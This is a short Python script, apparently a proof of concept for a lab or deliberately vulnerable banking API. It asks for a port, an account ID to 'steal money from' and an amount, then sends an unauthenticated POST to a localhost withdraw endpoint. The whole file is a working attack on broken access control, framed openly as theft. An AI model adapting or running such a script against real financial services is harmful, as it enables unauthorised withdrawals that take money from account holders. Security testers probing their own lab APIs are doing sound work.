import requests as req
import json

port_number = input("What is the port number of the API?\n")
accountID = input("What's the account ID that you wish to" +
                  " steal money from?\n")
amount = input("How much?\n")
payload = {"amount": amount,
           "accountID": accountID}
head = {"Content-Type": "application/json"}


url = "http://localhost:{}/api/accounts/withdraw".format(port_number)
with req.post(url, data=json.dumps(payload), headers=head) as marko:
    try:
        polo = marko.json()
        print(polo)
    except:
        print(marko.content.decode())
